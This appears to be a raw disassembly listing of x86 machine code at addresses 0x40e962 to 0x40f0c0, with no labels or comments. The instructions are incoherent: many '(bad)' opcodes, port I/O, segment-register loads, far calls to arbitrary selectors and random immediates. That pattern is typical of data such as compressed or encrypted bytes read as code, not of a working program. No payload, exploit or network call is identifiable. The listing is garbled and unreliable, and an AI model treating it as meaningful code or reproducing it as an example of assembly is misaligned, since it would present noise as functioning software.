  40e962:	jmp    0x8489:0xd12530a7
  40e969:	add    esp,DWORD PTR ss:[edi-0x77]
  40e96d:	mov    ah,BYTE PTR [edi+0x799db5b6]
  40e973:	cmp    DWORD PTR [eax],ebp
  40e975:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e976:	pop    es
  40e977:	cdq    
  40e978:	test   eax,0x24120ca
  40e97d:	mov    BYTE PTR [esi],ah
  40e97f:	xor    al,0x41
  40e981:	or     BYTE PTR [ecx],bh
  40e983:	pushf  
  40e984:	push   ebx
  40e985:	dec    ecx
  40e986:	jg     0x40e980
  40e988:	jae    0x40e9b0
  40e98a:	stos   DWORD PTR es:[edi],eax
  40e98b:	dec    esi
  40e98c:	push   ss
  40e98d:	and    ch,BYTE PTR [ebp-0x60]
  40e990:	cwde   
  40e991:	adc    bl,BYTE PTR [ebx+0x6]
  40e994:	sub    ecx,eax
  40e996:	sub    al,0xd4
  40e998:	out    0xb4,al
  40e99a:	mov    ch,0xd6
  40e99c:	dec    edi
  40e99d:	or     dh,bh
  40e99f:	cmp    ch,BYTE PTR [edx]
  40e9a1:	test   al,0x3d
  40e9a3:	mov    cl,BYTE PTR [ebp-0x7ecf578b]
  40e9a9:	out    dx,eax
  40e9aa:	mov    esp,0x68e106ac
  40e9af:	lds    esp,FWORD PTR [esi+0x7aca2dd8]
  40e9b5:	pop    ss
  40e9b6:	ds sbb al,0xe
  40e9b9:	in     eax,0x12
  40e9bb:	and    eax,0x797a46f6
  40e9c0:	xchg   edi,eax
  40e9c1:	push   edi
  40e9c2:	mov    esi,0x786ab80e
  40e9c7:	inc    ecx
  40e9c8:	(bad)  
  40e9c9:	cwde   
  40e9ca:	mov    edi,0x2df59278
  40e9cf:	mov    bl,0xc6
  40e9d1:	mov    esi,0x1b158ce9
  40e9d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9d7:	push   edi
  40e9d8:	jnp    0x40e9d9
  40e9da:	sar    DWORD PTR [esp+edx*4-0x68dae71a],cl
  40e9e1:	(bad)  
  40e9e2:	lds    ebp,FWORD PTR [eax+esi*4]
  40e9e5:	sub    DWORD PTR [edx],ebx
  40e9e7:	mov    bl,BYTE PTR [ecx]
  40e9e9:	lods   eax,DWORD PTR ds:[esi]
  40e9ea:	div    DWORD PTR [edx-0x76d2478d]
  40e9f0:	hlt    
  40e9f1:	hlt    
  40e9f2:	(bad)  
  40e9f3:	fild   QWORD PTR [ebx+0x29]
  40e9f6:	lods   al,BYTE PTR ds:[esi]
  40e9f7:	fs push 0x2a
  40e9fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9fb:	mov    ch,0x1f
  40e9fd:	xor    al,0x74
  40e9ff:	mov    gs,ebx
  40ea01:	xlat   BYTE PTR ds:[ebx]
  40ea02:	push   es
  40ea03:	mov    edi,0x8bd68cc9
  40ea08:	mov    esi,0xd77a06b6
  40ea0d:	pop    ebx
  40ea0e:	dec    eax
  40ea0f:	and    al,0xbe
  40ea11:	out    dx,al
  40ea12:	or     ebp,edi
  40ea14:	rcr    DWORD PTR [ecx],0x70
  40ea17:	out    0x7d,eax
  40ea19:	push   ss
  40ea1a:	mov    ebp,0x443969d8
  40ea1f:	sbb    ah,BYTE PTR [eax-0x3946397]
  40ea25:	imul   DWORD PTR [eax+esi*2]
  40ea28:	and    DWORD PTR [ebx],ebp
  40ea2a:	test   eax,0xb90313f3
  40ea2f:	xchg   ebx,eax
  40ea30:	cmp    DWORD PTR [ecx+0x70ca53eb],edi
  40ea36:	cmp    DWORD PTR [edx+edx*2],ebx
  40ea39:	inc    esi
  40ea3a:	les    ecx,FWORD PTR [esi-0x5d]
  40ea3d:	shl    DWORD PTR [edi-0x4b],1
  40ea40:	xor    bl,ch
  40ea42:	scas   eax,DWORD PTR es:[edi]
  40ea43:	fwait
  40ea44:	push   ebp
  40ea45:	sbb    DWORD PTR [ecx+0x312f3f],eax
  40ea4b:	mov    edi,0x65a42fca
  40ea50:	push   esp
  40ea51:	sub    esp,eax
  40ea53:	sbb    DWORD PTR ds:0x23e24a41,ebx
  40ea59:	shl    BYTE PTR [edx+edi*8+0x18],cl
  40ea5d:	daa    
  40ea5e:	jnp    0x40ea58
  40ea60:	inc    esi
  40ea61:	sub    bh,BYTE PTR [ecx]
  40ea63:	xchg   ebp,eax
  40ea64:	loop   0x40ea19
  40ea66:	pop    ds
  40ea67:	fdiv   DWORD PTR [esi+0x3cf0260e]
  40ea6d:	push   ss
  40ea6e:	test   DWORD PTR [esi],eax
  40ea70:	ins    DWORD PTR es:[edi],dx
  40ea71:	and    BYTE PTR [ecx+eax*4],dl
  40ea74:	stos   BYTE PTR es:[edi],al
  40ea75:	ins    DWORD PTR es:[edi],dx
  40ea76:	cmp    BYTE PTR [ecx],dl
  40ea78:	jmp    0x40eae0
  40ea7a:	mov    bh,0xd2
  40ea7c:	dec    edx
  40ea7d:	or     al,BYTE PTR [bx-0x2689]
  40ea82:	adc    esi,DWORD PTR [ebp-0x204c405d]
  40ea88:	lock sub BYTE PTR [edx-0x52],cl
  40ea8c:	xor    eax,0x448e78a9
  40ea91:	in     eax,0xc6
  40ea93:	out    dx,eax
  40ea94:	sub    al,0x39
  40ea96:	mov    al,cl
  40ea98:	push   ebx
  40ea99:	shr    al,cl
  40ea9b:	pop    ebx
  40ea9c:	mov    ecx,0x6a43d849
  40eaa1:	mov    edi,0x813b3510
  40eaa6:	adc    ch,BYTE PTR [ecx-0x418cd39c]
  40eaac:	or     ah,BYTE PTR [ecx]
  40eaae:	mov    al,ds:0xba6ceed4
  40eab3:	int3   
  40eab4:	mov    dh,0x53
  40eab6:	ret    
  40eab7:	ds add al,0xbb
  40eaba:	mov    ebp,0x80da8075
  40eabf:	outs   dx,DWORD PTR ds:[esi]
  40eac0:	rcl    DWORD PTR [edx],cl
  40eac2:	xor    eax,0xec5d33cc
  40eac7:	push   0xfffffff4
  40eac9:	cmp    DWORD PTR [eax+0x3d],ebp
  40eacc:	cmp    DWORD PTR [edi-0x65],0x21dfbe6c
  40ead3:	and    BYTE PTR [edi-0x3a],0xe9
  40ead7:	inc    esi
  40ead8:	add    ch,dl
  40eada:	sub    esi,DWORD PTR [esi+ebp*2]
  40eadd:	loopne 0x40ea5f
  40eadf:	add    BYTE PTR [edi+eiz*2-0x6896a946],ch
  40eae6:	aas    
  40eae7:	jmp    0x40eaf4
  40eae9:	push   ss
  40eaea:	ficomp WORD PTR [eax]
  40eaec:	cmp    al,0x59
  40eaee:	lea    esp,[ebx-0x4aff0128]
  40eaf4:	mov    ecx,0x1fbe6d79
  40eaf9:	into   
  40eafa:	test   BYTE PTR [esi-0x5b],bh
  40eafd:	(bad)  
  40eafe:	out    0xff,al
  40eb00:	pop    esi
  40eb01:	or     eax,0x754781af
  40eb06:	bound  esp,QWORD PTR [ebp+0x4f]
  40eb09:	sub    eax,0x2874e349
  40eb0e:	loopne 0x40eb30
  40eb10:	ret    0x66bb
  40eb13:	imul   edx,DWORD PTR [edx+0x17],0xffffffe9
  40eb17:	into   
  40eb18:	sbb    edi,DWORD PTR [edi]
  40eb1a:	sub    esi,esi
  40eb1c:	retf   0x6d05
  40eb1f:	mov    al,ds:0xe3ffe5aa
  40eb24:	or     BYTE PTR [ebp-0x49],dl
  40eb27:	and    eax,0x6cad88fe
  40eb2c:	scas   eax,DWORD PTR es:[edi]
  40eb2d:	loope  0x40ebaa
  40eb2f:	les    ebx,FWORD PTR [edi-0x16f9288d]
  40eb35:	jbe    0x40eb2c
  40eb37:	cld    
  40eb38:	inc    esp
  40eb39:	mov    al,ds:0x5a3e700c
  40eb3e:	shr    DWORD PTR [ecx-0xbd5daca],0xe6
  40eb45:	int    0x67
  40eb47:	inc    ebp
  40eb48:	inc    ebp
  40eb49:	mov    ds:0xce96772d,eax
  40eb4e:	aas    
  40eb4f:	fldcw  WORD PTR [edx]
  40eb51:	stos   DWORD PTR es:[edi],eax
  40eb52:	rcr    dl,cl
  40eb54:	aam    0x95
  40eb56:	add    eax,0xf494faff
  40eb5b:	sbb    edx,edx
  40eb5d:	(bad)  
  40eb5e:	dec    edi
  40eb5f:	mov    DWORD PTR [esp+eiz*8+0x2c],esi
  40eb63:	nop    esi
  40eb66:	pop    ebx
  40eb67:	cli    
  40eb68:	push   esp
  40eb69:	imul   esp,DWORD PTR [ebp+esi*4+0x2d],0xafe2e2e4
  40eb71:	jbe    0x40eba2
  40eb73:	cmp    DWORD PTR [ebx],eax
  40eb75:	sub    eax,0xa03c4212
  40eb7a:	fsub   QWORD PTR [ebp-0x3d]
  40eb7d:	in     al,dx
  40eb7e:	(bad)  [ebp+0x8]
  40eb81:	imul   esp,DWORD PTR [ebp+ebp*1-0x17670d73],0x39
  40eb89:	push   esp
  40eb8a:	fs out dx,eax
  40eb8c:	and    al,0x72
  40eb8e:	sub    ah,dl
  40eb90:	out    0xc5,al
  40eb92:	add    eax,0xf0cc016a
  40eb97:	mov    dl,BYTE PTR [edi+ebx*1]
  40eb9a:	shr    DWORD PTR [edx+0x53],1
  40eb9d:	cmp    ah,ah
  40eb9f:	xor    al,0x36
  40eba1:	mov    dl,0x37
  40eba3:	fcom   DWORD PTR [ebx+ebp*4-0x44]
  40eba7:	(bad)  
  40eba8:	fadd   st,st(6)
  40ebaa:	int    0xb4
  40ebac:	icebp  
  40ebad:	adc    dh,BYTE PTR [eax-0xc]
  40ebb0:	jg     0x40ebc7
  40ebb2:	pop    es
  40ebb3:	xor    al,0x41
  40ebb6:	lods   eax,DWORD PTR ds:[esi]
  40ebb7:	mov    BYTE PTR [eax],bh
  40ebb9:	adc    DWORD PTR [eax*2-0x15ff06c6],esi
  40ebc0:	adc    DWORD PTR [ebp+eax*4-0x5c],0xec69f58e
  40ebc8:	test   al,0xe0
  40ebca:	dec    ecx
  40ebcb:	ret    
  40ebcc:	push   ecx
  40ebcd:	jnp    0x40ebd6
  40ebcf:	mov    edi,0x76b0e4b7
  40ebd4:	fstp   DWORD PTR [edi+0x167c922]
  40ebda:	test   eax,0x3db20636
  40ebdf:	es stc 
  40ebe1:	dec    ebx
  40ebe2:	inc    eax
  40ebe3:	push   edx
  40ebe4:	pop    esp
  40ebe5:	and    eax,0x2ab686ed
  40ebea:	repnz xchg al,dl
  40ebed:	sbb    cl,BYTE PTR [eax]
  40ebef:	mov    ds:0xc9b6d8b8,eax
  40ebf4:	mov    edi,DWORD PTR [eax+0x21]
  40ebf7:	xchg   DWORD PTR [esi],esi
  40ebf9:	ds mov ecx,0xd5afbf47
  40ebff:	lods   al,BYTE PTR ds:[si]
  40ec01:	adc    eax,DWORD PTR [esi-0x2a]
  40ec04:	int3   
  40ec05:	inc    esi
  40ec06:	mov    DWORD PTR [edi],esi
  40ec08:	mov    cs,WORD PTR [edi-0x73]
  40ec0b:	in     al,0x23
  40ec0d:	mov    fs,ecx
  40ec0f:	jne    0x40ec5d
  40ec11:	or     BYTE PTR [ebp-0x3],0x4a
  40ec15:	test   al,0xd2
  40ec17:	mov    WORD PTR [edi],ds
  40ec19:	adc    bh,ch
  40ec1b:	xchg   ebp,eax
  40ec1c:	fwait
  40ec1d:	push   ecx
  40ec1e:	lods   eax,DWORD PTR ds:[esi]
  40ec1f:	test   al,0x4f
  40ec21:	xchg   edi,eax
  40ec22:	pop    edi
  40ec23:	outs   dx,DWORD PTR ds:[esi]
  40ec24:	mov    edi,0x34bcb031
  40ec29:	mov    al,ds:0xd7045e1b
  40ec2e:	imul   ebx,DWORD PTR [edi-0x5c862771],0x643d709e
  40ec38:	mov    edx,0x87649c77
  40ec3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec3e:	cmp    DWORD PTR [ecx],ebx
  40ec40:	mov    ebx,0x8d6a6a58
  40ec45:	xor    esi,DWORD PTR [edx+0x62]
  40ec48:	add    al,0xb0
  40ec4a:	cmp    eax,0xbcf91637
  40ec4f:	ficomp DWORD PTR [esi+0x3a8cc26]
  40ec55:	inc    esp
  40ec56:	lods   eax,DWORD PTR ds:[esi]
  40ec57:	dec    esi
  40ec58:	mov    bl,0x10
  40ec5a:	cwde   
  40ec5b:	add    dl,dh
  40ec5d:	ins    BYTE PTR es:[edi],dx
  40ec5e:	retf   
  40ec5f:	cli    
  40ec60:	arpl   WORD PTR [eax-0x50],bp
  40ec63:	ja     0x40ecc3
  40ec65:	lods   eax,DWORD PTR ds:[esi]
  40ec66:	mov    eax,ds:0x652bcdae
  40ec6b:	fdiv   QWORD PTR [ebx]
  40ec6d:	mov    ebp,0x9a5e5461
  40ec72:	movsx  ebx,WORD PTR [edi]
  40ec75:	leave  
  40ec76:	mul    DWORD PTR ds:[edx+0x32afc0f7]
  40ec7d:	mov    edi,0xc3680fc9
  40ec82:	sbb    ch,BYTE PTR [ebx+edi*4]
  40ec85:	xor    bh,BYTE PTR ds:0x1a731764
  40ec8b:	neg    DWORD PTR [edi]
  40ec8d:	mov    DWORD PTR [esi+0x61],esp
  40ec90:	add    bh,BYTE PTR [ecx+edx*1]
  40ec93:	xchg   BYTE PTR [edx-0xe631be1],bl
  40ec99:	inc    ebp
  40ec9a:	fmul   DWORD PTR [eax-0x34]
  40ec9d:	pop    es
  40ec9e:	icebp  
  40ec9f:	pop    esi
  40eca0:	fidivr WORD PTR [edi]
  40eca2:	mov    ecx,0x139fcdb8
  40eca7:	call   0x1631:0x731daac6
  40ecae:	test   DWORD PTR [ebx],edx
  40ecb0:	arpl   bp,ax
  40ecb2:	mov    BYTE PTR [edi-0x3d4970cd],dl
  40ecb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecb9:	sub    DWORD PTR [edi+0x11e9c3ca],ebp
  40ecbf:	in     al,0x46
  40ecc1:	mov    eax,ds:0xee6aed4c
  40ecc6:	mov    dl,0x58
  40ecc8:	push   ecx
  40ecc9:	pop    ebp
  40ecca:	lock mov ebp,0xf1ddc4a9
  40ecd0:	mov    ebx,0xf0ae0be2
  40ecd5:	(bad)  
  40ecd6:	push   0xffffffc6
  40ecd8:	cmp    BYTE PTR [edx-0xe697392],bh
  40ecde:	jp     0x40ecc2
  40ece0:	cwde   
  40ece1:	cmp    BYTE PTR [ecx],0xa7
  40ece4:	sti    
  40ece5:	pop    esi
  40ece6:	mov    edi,0x361ae85a
  40eceb:	repz jg 0x40ec94
  40ecee:	pop    ds
  40ecef:	push   esi
  40ecf0:	enter  0xa47f,0x2
  40ecf4:	aaa    
  40ecf5:	adc    ch,BYTE PTR [ecx]
  40ecf7:	and    eax,0xdf3a7997
  40ecfc:	retf   0x983a
  40ecff:	xlat   BYTE PTR ds:[ebx]
  40ed00:	push   eax
  40ed01:	cli    
  40ed02:	pop    ss
  40ed03:	push   cs
  40ed04:	cmp    BYTE PTR [edx+0xe6e0491],ch
  40ed0a:	or     al,BYTE PTR [edi+edi*1]
  40ed0d:	loope  0x40ed1c
  40ed0f:	mov    edx,edx
  40ed11:	out    0x73,al
  40ed13:	mov    ds:0x16e6a6ba,al
  40ed18:	test   al,0x99
  40ed1a:	cmp    eax,0x627c9cef
  40ed1f:	jo     0x40ed04
  40ed21:	(bad)  
  40ed22:	adc    eax,0x643c562c
  40ed27:	sbb    eax,0x49ef6cb5
  40ed2c:	(bad)  
  40ed2d:	rol    ebx,cl
  40ed2f:	data16 or bl,BYTE PTR [ebx+ecx*8]
  40ed33:	sbb    ch,BYTE PTR [edx-0x71]
  40ed36:	dec    eax
  40ed37:	mov    eax,ds:0xb31b0c94
  40ed3c:	call   0x782f81ca
  40ed41:	(bad)  
  40ed42:	ja     0x40ecd2
  40ed44:	mov    edi,0xbb382808
  40ed49:	lods   eax,DWORD PTR ds:[esi]
  40ed4a:	mov    ds:0x5fc1beaf,eax
  40ed4f:	mov    ebp,0xb7d4063f
  40ed54:	jg     0x40ed24
  40ed56:	xchg   edi,eax
  40ed57:	mov    bh,0xb8
  40ed59:	(bad)  
  40ed5a:	sub    DWORD PTR [edx-0x1edf3fa5],eax
  40ed60:	out    0x7f,eax
  40ed62:	xor    ecx,DWORD PTR [esi-0x2cf096fa]
  40ed68:	or     eax,0xe1944510
  40ed6d:	mov    ah,al
  40ed6f:	dec    ebp
  40ed70:	outs   dx,BYTE PTR ds:[esi]
  40ed71:	sbb    eax,0xe9fb20e6
  40ed76:	inc    esi
  40ed77:	(bad)  
  40ed78:	fisub  DWORD PTR [ebp+eiz*2+0x52b86bdf]
  40ed7f:	fs push es
  40ed81:	popf   
  40ed82:	outs   dx,BYTE PTR ds:[esi]
  40ed83:	js     0x40ee02
  40ed85:	jmp    0x2bc33bd3
  40ed8a:	nop
  40ed8b:	push   ds
  40ed8c:	not    BYTE PTR [esi]
  40ed8e:	(bad)
  40ed91:	jnp    0x40ed89
  40ed93:	arpl   WORD PTR [edi],bx
  40ed95:	je     0x40edb4
  40ed97:	arpl   WORD PTR [esi+0x6],cx
  40ed9a:	out    0x8,eax
  40ed9c:	fmul   DWORD PTR [eax+0x55]
  40ed9f:	cs inc ecx
  40eda1:	fldenv [ebx]
  40eda3:	push   esp
  40eda4:	sbb    BYTE PTR [eax*2+0x6be80322],0xce
  40edac:	sbb    bh,bh
  40edae:	or     eax,0x3c89d1e0
  40edb3:	jecxz  0x40edd7
  40edb5:	push   eax
  40edb6:	cmp    esp,ebx
  40edb8:	adc    esi,esp
  40edba:	mov    ds:0xa02538bc,eax
  40edbf:	outs   dx,BYTE PTR ds:[esi]
  40edc0:	(bad)  
  40edc1:	scas   eax,DWORD PTR es:[edi]
  40edc2:	stos   DWORD PTR es:[edi],eax
  40edc3:	out    0x46,al
  40edc5:	xchg   edi,eax
  40edc6:	lahf   
  40edc7:	adc    al,0x39
  40edc9:	push   ds
  40edca:	call   0x5558:0x824a5220
  40edd1:	xchg   ebp,eax
  40edd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edd3:	cmp    edx,eax
  40edd5:	retf   0x6719
  40edd8:	ins    DWORD PTR es:[edi],dx
  40edd9:	lds    ebp,FWORD PTR [esi+eiz*4+0xf5c6d1a]
  40ede0:	add    BYTE PTR [edi+0x10ea9549],cl
  40ede6:	add    BYTE PTR [edx],dh
  40ede8:	xor    ebp,DWORD PTR [ebp-0x34]
  40edeb:	xor    ebx,DWORD PTR [esi-0x6d]
  40edee:	mov    eax,ds:0xc248bd6a
  40edf3:	cmp    eax,0x8e8073a3
  40edf8:	xor    esp,ecx
  40edfa:	jge    0x40ed90
  40edfc:	add    eax,DWORD PTR [ebp+0x5ec034ce]
  40ee02:	jo     0x40ee80
  40ee04:	ds push ecx
  40ee06:	loopne 0x40ee6f
  40ee08:	loope  0x40edfd
  40ee0a:	and    eax,0x780f8dce
  40ee0f:	mov    eax,ds:0xafe54c8c
  40ee14:	or     al,0x51
  40ee16:	out    0xab,al
  40ee18:	(bad)  
  40ee19:	and    edi,DWORD PTR [esi+0x52544e62]
  40ee1f:	sahf   
  40ee20:	pusha  
  40ee21:	add    bl,BYTE PTR [edx+0x1590bee9]
  40ee27:	and    al,0x37
  40ee29:	xor    DWORD PTR [ebp+0x6d],ebp
  40ee2c:	or     BYTE PTR [edi-0x80],cl
  40ee2f:	xor    edi,edi
  40ee31:	test   eax,0x99d115ce
  40ee36:	mov    ch,0x58
  40ee38:	jne    0x40ee6e
  40ee3a:	and    DWORD PTR [ecx],esp
  40ee3c:	imul   esp,DWORD PTR [edx+0x380b7cae],0xa7120374
  40ee46:	mov    dh,BYTE PTR [ebx-0x7f3ee67e]
  40ee4c:	sar    DWORD PTR [edi+edx*4],1
  40ee4f:	or     esp,DWORD PTR [eax-0x72]
  40ee52:	sbb    al,0x7d
  40ee54:	cmp    BYTE PTR [edx],ch
  40ee56:	push   cs
  40ee57:	aaa    
  40ee58:	retf   0xcf69
  40ee5b:	aam    0x41
  40ee5d:	push   ss
  40ee5e:	pop    edx
  40ee5f:	add    eax,0xc382ba5f
  40ee64:	out    0x14,al
  40ee66:	rcr    DWORD PTR gs:[ecx+0x4],cl
  40ee6a:	retf   0xc927
  40ee6d:	leave  
  40ee6e:	mov    cl,BYTE PTR [edx]
  40ee70:	jne    0x40ee45
  40ee72:	out    dx,al
  40ee73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee74:	xchg   BYTE PTR [edx+eax*1+0x63],cl
  40ee78:	and    DWORD PTR [ebx+0x77],esi
  40ee7b:	mov    BYTE PTR [eax],dl
  40ee7d:	sbb    al,0x65
  40ee7f:	jg     0x40ee97
  40ee81:	imul   edi,DWORD PTR [esi+0x1525c4c1],0x683cc852
  40ee8b:	push   0xffffffda
  40ee8d:	push   es
  40ee8e:	inc    ebp
  40ee8f:	lahf   
  40ee90:	add    edi,DWORD PTR [ecx]
  40ee92:	(bad)  
  40ee93:	mov    esi,0xce974f0d
  40ee98:	add    al,BYTE PTR [edx]
  40ee9a:	mov    ds:0x49aea90c,eax
  40ee9f:	dec    esp
  40eea0:	pop    ebp
  40eea1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eea2:	sbb    BYTE PTR [eax-0x59c8e8ea],al
  40eea8:	mov    es,eax
  40eeaa:	and    eax,0x38ca76f0
  40eeaf:	mov    al,0xe8
  40eeb1:	mov    eax,0xc5379d8a
  40eeb6:	jbe    0x40eeeb
  40eeb8:	(bad)  
  40eeb9:	iret   
  40eeba:	push   ebx
  40eebb:	xlat   BYTE PTR ds:[ebx]
  40eebc:	sti    
  40eebd:	test   al,0x82
  40eebf:	add    eax,0x3252aea1
  40eec4:	xor    BYTE PTR [edi+0x65],bh
  40eec7:	std    
  40eec8:	add    eax,0x2844f980
  40eecd:	mov    ebx,0x907999ac
  40eed2:	dec    BYTE PTR [ebp-0x28]
  40eed5:	test   BYTE PTR ds:0xd96a07e6,bl
  40eedb:	test   al,0x78
  40eedd:	dec    edx
  40eede:	rcr    DWORD PTR [esi-0x53b8df62],0xf6
  40eee5:	int3   
  40eee6:	inc    eax
  40eee7:	pop    es
  40eee8:	mov    edx,0x2effe47e
  40eeed:	inc    eax
  40eeee:	ret    
  40eeef:	test   DWORD PTR [ebx-0x4],edx
  40eef2:	aaa    
  40eef3:	adc    DWORD PTR [edi+0x26450509],edx
  40eef9:	fidivr DWORD PTR [ecx+0x18]
  40eefc:	nop
  40eefd:	mov    ch,0x15
  40eeff:	fisubr WORD PTR [eax]
  40ef01:	xor    eax,0x56a0b3dc
  40ef06:	and    eax,0xd2dfcdd8
  40ef0b:	sub    al,0xfe
  40ef0d:	jnp    0x40eee9
  40ef0f:	js     0x40ef17
  40ef11:	mov    BYTE PTR [edx-0x2168744f],cl
  40ef17:	mov    edi,0x6cf8c6eb
  40ef1c:	loope  0x40eee9
  40ef1e:	icebp  
  40ef1f:	fs (bad) 
  40ef21:	mov    eax,ds:0xcf4a997d
  40ef26:	or     al,0x4a
  40ef28:	out    dx,al
  40ef29:	pusha  
  40ef2a:	xchg   ecx,ebx
  40ef2c:	push   edx
  40ef2d:	adc    dl,BYTE PTR [eax]
  40ef2f:	dec    ecx
  40ef30:	sbb    ecx,DWORD PTR [edx-0x19]
  40ef33:	xchg   esp,eax
  40ef34:	lods   eax,DWORD PTR ds:[esi]
  40ef35:	rol    BYTE PTR [eax-0x27590797],cl
  40ef3b:	sbb    al,BYTE PTR [esi-0x29]
  40ef3e:	sbb    ch,BYTE PTR [esi+esi*1]
  40ef41:	neg    DWORD PTR [ebx-0x21]
  40ef44:	les    ebp,FWORD PTR [ebx+edx*8-0x4852b2eb]
  40ef4b:	or     ebx,esi
  40ef4d:	scas   al,BYTE PTR es:[edi]
  40ef4e:	sbb    DWORD PTR [ebp+0x63],eax
  40ef51:	aad    0x1a
  40ef53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef54:	jbe    0x40ef2d
  40ef56:	loop   0x40ef51
  40ef58:	mov    ah,0xc7
  40ef5a:	pusha  
  40ef5b:	retf   
  40ef5c:	push   cs
  40ef5d:	dec    eax
  40ef5e:	sti    
  40ef5f:	jg     0x40ef1a
  40ef61:	(bad)  
  40ef62:	pusha  
  40ef63:	pop    ds
  40ef64:	or     BYTE PTR [ecx+0x66a29a78],0xab
  40ef6b:	sbb    edx,DWORD PTR [eax]
  40ef6d:	and    al,0xd3
  40ef6f:	loopne 0x40ef89
  40ef71:	std    
  40ef72:	es xchg edi,eax
  40ef74:	inc    edx
  40ef75:	lea    esp,[edi+0x7f]
  40ef78:	mov    al,ds:0x91d32d0c
  40ef7d:	push   0xffffffd4
  40ef7f:	dec    edi
  40ef80:	xchg   edi,eax
  40ef81:	xchg   dl,bh
  40ef83:	and    ecx,DWORD PTR [edi+ebp*8]
  40ef86:	adc    BYTE PTR [ebp+0xf],0x79
  40ef8a:	pop    eax
  40ef8b:	je     0x40efef
  40ef8d:	add    bl,cl
  40ef8f:	cmc    
  40ef90:	pop    edx
  40ef91:	jecxz  0x40eff3
  40ef93:	imul   esi,DWORD PTR [eax],0x1e
  40ef96:	dec    DWORD PTR ds:0x69ec48fb
  40ef9c:	or     al,0xf3
  40ef9e:	shl    BYTE PTR [edx],0xc2
  40efa1:	jge    0x40ef7d
  40efa3:	mov    ch,dl
  40efa5:	rcr    ah,1
  40efa7:	inc    edx
  40efa9:	outs   dx,BYTE PTR ds:[esi]
  40efaa:	ror    cl,cl
  40efac:	lods   eax,DWORD PTR ds:[esi]
  40efad:	xchg   esp,eax
  40efae:	arpl   WORD PTR [ecx+0x1e],di
  40efb1:	dec    ebp
  40efb2:	cdq    
  40efb3:	test   BYTE PTR [eax-0x7f],bh
  40efb6:	or     al,0x3
  40efb8:	loopne 0x40effc
  40efba:	sbb    ebx,DWORD PTR [ebx+0x74fb72d0]
  40efc0:	stc    
  40efc1:	iret   
  40efc2:	clc    
  40efc3:	sbb    BYTE PTR [ebp-0x37],dl
  40efc6:	ds sbb cl,ah
  40efc9:	into   
  40efca:	xor    ecx,eax
  40efcc:	jbe    0x40f00b
  40efce:	add    BYTE PTR [edi+0x167ab0a],al
  40efd4:	sbb    al,0x11
  40efd6:	jmp    0x40efdd
  40efd8:	xchg   ecx,eax
  40efd9:	out    dx,al
  40efda:	jb     0x40f01d
  40efdc:	fisubr WORD PTR [ebx-0x37]
  40efdf:	cs addr16 int3 
  40efe2:	aad    0x28
  40efe4:	(bad)  
  40efe5:	int3   
  40efe6:	xchg   edi,eax
  40efe7:	push   0x68
  40efe9:	iret   
  40efea:	add    al,0x77
  40efec:	mov    ds:0xac1f5654,al
  40eff1:	xchg   edx,eax
  40eff2:	pop    es
  40eff3:	pusha  
  40eff4:	cli    
  40eff5:	repnz cmp esp,DWORD PTR [ecx+0x38]
  40eff9:	repz stc 
  40effb:	imul   eax,DWORD PTR [esp+ebp*2],0x78e5a755
  40f002:	data16 int3 
  40f004:	sbb    dh,BYTE PTR [eax-0x1b]
  40f007:	fucomp st(5)
  40f009:	inc    edx
  40f00a:	call   FWORD PTR [edx-0x1410f488]
  40f010:	xchg   ebx,eax
  40f011:	in     eax,dx
  40f012:	cdq    
  40f013:	ret    
  40f014:	xchg   ebp,eax
  40f015:	jecxz  0x40f075
  40f017:	std    
  40f018:	das    
  40f019:	pop    ss
  40f01a:	lea    esp,[ecx-0x12]
  40f01d:	jne    0x40f030
  40f01f:	jmp    0x40efb7
  40f021:	repz jnp 0x40f079
  40f024:	jle    0x40eff1
  40f026:	add    edx,DWORD PTR [ecx]
  40f028:	outs   dx,BYTE PTR ds:[esi]
  40f029:	cmp    DWORD PTR [ebp-0x4bb9d413],ebx
  40f02f:	jge    0x40f04a
  40f031:	sbb    ebp,DWORD PTR [ebp+0x4]
  40f034:	cmp    eax,0xee8d6845
  40f039:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f03a:	lahf   
  40f03b:	call   0x9bd9:0xb5d059b1
  40f042:	jmp    0x40f0a3
  40f044:	sub    al,0xa2
  40f046:	daa    
  40f047:	push   ss
  40f048:	xchg   esp,eax
  40f049:	add    al,0x6d
  40f04b:	and    DWORD PTR ds:0xeda8a20b,eax
  40f051:	mov    ebp,0x44819b93
  40f056:	xchg   ebp,eax
  40f057:	adc    al,0x97
  40f059:	inc    esp
  40f05a:	cmp    bh,cl
  40f05c:	scas   eax,DWORD PTR es:[edi]
  40f05d:	test   BYTE PTR ds:0xa6ecb044,al
  40f063:	jb     0x40f025
  40f065:	icebp  
  40f066:	inc    edi
  40f067:	sbb    DWORD PTR [esi],ecx
  40f069:	call   0x763f:0xc4a84afc
  40f070:	daa    
  40f071:	xchg   edi,eax
  40f072:	add    DWORD PTR [ebx+0x3e],0xffffffb4
  40f076:	leave  
  40f077:	xchg   ebp,eax
  40f078:	and    eax,0xbbd02aef
  40f07d:	dec    ebx
  40f07e:	fcom   DWORD PTR [ebx-0x64]
  40f081:	jne    0x40f08d
  40f083:	js     0x40f07a
  40f085:	mov    al,ds:0x458eb70
  40f08a:	test   eax,0xd712c835
  40f08f:	and    eax,0x6ca65fb5
  40f094:	mov    bl,0x6d
  40f096:	scas   eax,DWORD PTR es:[edi]
  40f097:	push   eax
  40f098:	pop    ebp
  40f099:	sbb    DWORD PTR [ecx-0x52],edx
  40f09c:	lds    eax,FWORD PTR ds:0xc1e9710c
  40f0a2:	inc    esp
  40f0a3:	arpl   WORD PTR [edi-0x53746757],ax
  40f0a9:	jnp    0x40f048
  40f0ab:	fwait
  40f0ac:	hlt    
  40f0ad:	int    0x26
  40f0af:	xchg   ebx,eax
  40f0b0:	xor    al,0x47
  40f0b2:	dec    ecx
  40f0b3:	(bad)  
  40f0b4:	lock bound edi,QWORD PTR [esi-0x6e6b44ad]
  40f0bb:	test   al,0xab
  40f0bd:	ss stos DWORD PTR es:[edi],eax
  40f0bf:	push   esi
  40f0c0:	daa    
